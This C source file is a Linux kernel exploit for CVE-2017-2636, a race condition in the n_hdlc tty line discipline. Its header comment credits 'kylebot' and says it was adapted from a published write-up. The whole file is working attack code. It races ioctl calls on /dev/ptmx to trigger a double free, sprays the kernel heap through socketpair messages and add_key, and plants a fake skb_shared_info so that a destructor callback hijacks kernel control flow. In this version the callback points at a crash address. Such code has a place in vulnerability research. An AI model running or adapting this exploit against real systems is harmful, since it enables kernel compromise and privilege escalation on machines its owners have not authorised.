/* exploit written by kylebot
 * modified from https://a13xp0p0v.github.io/2017/03/24/CVE-2017-2636.html
 * */
#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <unistd.h>
#include <fcntl.h>
#include <pthread.h>
#include <errno.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <asm-generic/ioctls.h>
#include <asm/termbits.h>
#include "libexp.h"

#define KMALLOC_PAD 16
#define TTY_BUF_SZ 0x100
#define MSG_SPRAY_NUM 8
#define BUF_SPRAY_NUM 60
#define PORT 12345
#define SHINFO_OFFSET 7872
#define CRASH_IP 0xffffffffdeadbeef
#define UADDR1 0x800000
#define UADDR2 0x8000000000

int ptmd;
int value = 0;
int *stage = &value;
char payload[0x2000];
char exp_buffer[7872];

struct skb_shared_info {
    uint8_t  __unused;      // __u8
    uint8_t  meta_len;      // __u8
    uint8_t  nr_frags;      // __u8
    uint8_t  tx_flags;      // __u8
    uint16_t gso_size;      // unsigned short
    uint16_t gso_segs;      // unsigned short
    uint64_t frag_list;     // struct sk_buff *
    uint64_t hwtstamps;     // struct skb_shared_hwtstamps
    uint32_t gso_type;      // unsigned int
    uint32_t tskey;         // u32
    uint32_t dataref;       // atomic_t
    uint64_t destructor_arg;    // void *
    uint8_t  frags[16][17];     // skb_frag_t frags[MAX_SKB_FRAGS];
};

struct ubuf_info {
    uint64_t callback;  // void (*callback)(struct ubuf_info *, bool)
    uint64_t ctx;       // void *
    uint64_t desc;      // unsigned long
};

void init_skb_buffer(char* buffer) {
    struct skb_shared_info* ssi = (struct skb_shared_info*)buffer;
    memset(ssi, 0, sizeof(*ssi));

    ssi->gso_size = 0xff00;
    ssi->tx_flags = 0xff;
    ssi->destructor_arg = (uint64_t)UADDR2;
    ssi->nr_frags = 0;
    ssi->frag_list = 0;
}

void *func1(void *arg)
{
	//set_cpu(1);
	while(*stage == 0);
	ioctl(ptmd, TCFLSH, TCIOFLUSH);
}

void *func2(void *arg)
{
	//set_cpu(2);
	while(*stage == 0);
	ioctl(ptmd, TCXONC, TCOON);
}

void trigger(void)
{
	pthread_t t1, t2;
	*stage = 0;

	pthread_create(&t1, NULL, func1, NULL);
	pthread_create(&t2, NULL, func2, NULL);
	usleep(10000);
	*stage = 1;
	usleep(10000);
	*stage = 0;
}

struct udp_fifo_handle {
	int fds[2];
};

void udp_fifo_init(struct udp_fifo_handle* handle) {
	int rv = socketpair(AF_LOCAL, SOCK_DGRAM, 0, handle->fds);
	if (rv != 0) {
		perror("[-] fail to create heap spraying sockets");
		exit(-1);
	}
}

void udp_fifo_kmalloc(struct udp_fifo_handle* handle, char *buffer) {
	int rv = send(handle->fds[0], buffer, 7872, 0);
	if (rv != 7872) {
		perror("send()");
		exit(-1);
	}
}

void udp_fifo_kfree(struct udp_fifo_handle* handle, char *buffer) {
	int rv = recv(handle->fds[1], buffer, 7872, 0);
	if (rv != 7872) {
		perror("recv()");
		exit(-1);
	}
}

void udp_kmalloc_pad() {
	int i, j;
	char dummy[2048];
	struct udp_fifo_handle uh[16];
	for (i = 0; i < KMALLOC_PAD / 16; i++) {
		udp_fifo_init(&uh[i]);
		for (j = 0; j < 16; j++)
			udp_fifo_kmalloc(&uh[i], &dummy[0]);
	}
}

void defragmentation(u32 num)
{
	char buffer[0x2000];
	add_key_spray_num(buffer, 0x2000-0x30, num);
}

void socket_sendmmsg(int sock, char *buffer) {
	struct mmsghdr msg[1];

	msg[0].msg_hdr.msg_iovlen = 0;

	// Buffer to kmalloc.
	msg[0].msg_hdr.msg_control = &buffer[0];
	msg[0].msg_hdr.msg_controllen = 0x2000;

	// Make sendmmsg exit easy with EINVAL.
	msg[0].msg_hdr.msg_name = "root";
	msg[0].msg_hdr.msg_namelen = 1;

	int rv = syscall(__NR_sendmmsg, sock, msg, 1, 0);
	if (rv == -1 && errno != EINVAL) {
		perror("[-] sendmmsg()");
		exit(EXIT_FAILURE);
	}
}

void payload_setup(void)
{
	struct ubuf_info *ui;

	// setup ubuf_info
	umem_alloc((void *)UADDR1, 0x1000);
	umem_alloc((void *)UADDR2, 0x1000);
	ui = (struct ubuf_info *)UADDR1;
    ui->callback = CRASH_IP;
	ui = (struct ubuf_info *)UADDR2;
    ui->callback = CRASH_IP;

	// setup payload + skb_shared_info
	memset(payload, 'C', sizeof(payload));
	memset(&payload[SHINFO_OFFSET]-0x20, 0, sizeof(payload)-SHINFO_OFFSET+0x10);
	init_skb_buffer(&payload[SHINFO_OFFSET]);
	*(long *)&payload[18] = 0;

	memset(exp_buffer, 'B', sizeof(exp_buffer));
	memset(exp_buffer, 0, 8);
}

int main()
{
	int ret;
	int ldisc = N_HDLC;
	char buf[TTY_BUF_SZ];
	char udp_buffer[7872];
	int bytes;
	struct udp_fifo_handle handle;
	struct udp_fifo_handle exp_handle;

	payload_setup();

	memset(buf, 'A', sizeof(buf));


	defragmentation(10);
	for(int i=0; i<1000; i++) {
		defragmentation(5);
		if(handle.fds[0]) {
			close(handle.fds[0]);
			close(handle.fds[1]);
		}
		if(exp_handle.fds[0]) {
			close(exp_handle.fds[0]);
			close(exp_handle.fds[1]);
		}
		udp_fifo_init(&handle);
		udp_fifo_init(&exp_handle);

		printf("i: %d\n", i);
		puts("-------------------------");
		ptmd = open("/dev/ptmx", O_RDWR);
		if(ptmd < 0) error_out("[-] open /dev/ptmx");

		ret = ioctl(ptmd, TIOCSETD, &ldisc);
		if(ret < 0) error_out("[-] TIOCSETD");

		ret = ioctl(ptmd, TCXONC, TCOOFF);
		if(ret < 0) error_out("[-] TCXONC TCOOFF");

		bytes = write(ptmd, buf, TTY_BUF_SZ);
		if (bytes != TTY_BUF_SZ) error_out("[-] write to ptmx (bytes)\n");

		trigger();

		ret = close(ptmd);
		if(unlikely(ret != 0)) error_out("[-] close /dev/ptmx");

		// the bug may be triggered now
		// step1. do some allocation and we taint the buffer
		for(int i=0; i<MSG_SPRAY_NUM; i++) {
			memset(&udp_buffer[8], (char)i, 8);
			memset(udp_buffer, 0, 8);// don't fk up slub freelist
			udp_fifo_kmalloc(&handle, udp_buffer);
		}
		// step2. check whether the vulnerability is triggered by checking the taint
		// if there is a mismatch between taint and index, that means the vulnerability is triggered.
		int array[MSG_SPRAY_NUM];
		memset(array, 0, sizeof(array));
		char taint;
		int idx = -1;
		for(int i=0; i<MSG_SPRAY_NUM; i++) {
			udp_fifo_kfree(&handle, udp_buffer);
			taint = ((char *)udp_buffer)[9];
			if(i != (int)taint) {
				idx = i;
				break;
			}
		}

		// in case not triggered, just continue
		if(unlikely(idx < 0)) continue;

		// taint should be larger than idx because the second allocation overwrites the first one
		// if there is anything wrong, we pretend nothing happened, clean up leftovers and continue
		if(unlikely(taint < idx)) {
			for(int i=idx+1; i<MSG_SPRAY_NUM; i++) {
				udp_fifo_kfree(&handle, udp_buffer);
			}
			continue;
		}

		// allocate the vulnerable struct sk_buff
		for(int i=0; i<1; i++) {
			udp_fifo_kmalloc(&exp_handle, exp_buffer);
		}

		//puts(">>");
		//printf("%d %d\n", idx, taint);
		//getchar();

		// free the left buffers and one of them should be overlapping with one of the target objects
		for(int i=idx+1; i<MSG_SPRAY_NUM; i++) {
			udp_fifo_kfree(&handle, udp_buffer);
			nonsense();
			add_key_spray_num(&payload[0x12], 0x2000-0x30, 1);
		}

		// try to trigger the vulnerability
		for(int i=0; i<1; i++) {
			udp_fifo_kfree(&exp_handle, exp_buffer);
		}

		//puts("end?");
		//getchar();

		exit(0);
	}
}
